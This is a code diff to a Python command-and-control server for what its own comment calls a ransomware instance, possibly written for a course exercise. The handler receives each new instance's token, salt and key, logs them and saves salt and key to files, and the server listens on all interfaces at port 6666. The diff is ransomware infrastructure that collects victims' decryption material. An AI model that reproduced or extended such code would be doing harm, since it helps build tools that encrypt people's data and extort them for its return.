@@ -19,10 +19,27 @@ class CNC(CNCBase):
 
     def post_new(self, path:str, params:dict, body:dict)->dict:
         # used to register new ransomware instance
-        os.mkdir(CNC.ROOT_PATH + "/token")
 
+        token = body["token"]
+        salt = body["salt"]
+        key = body["key"]
 
-        return 
+        self._log(f"Token importé : {token}, type de données : {type(token)}")
+        self._log(f"Token importé : {salt}, type de données : {type(salt)}")
+        self._log(f"Token importé : {key}, type de données : {type(key)}")
+
+        #self.save_b64(token, path, "token.bin")
+        self.save_b64(salt, path, "salt.bin")
+        self.save_b64(key, path, "key.bin")
+        
+        #os.mkdir(CNC.ROOT_PATH + "/token")
+        #with open(CNC.ROOT_PATH + "/token.bin") as file_token:
+        #    file_token.write(token)
+        
+        #with open(CNC.ROOT_PATH + "/salt.bin") as file_salt:
+        #    file_salt.write(salt)       
+
+        return {"status" : "OK"}
 
            
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
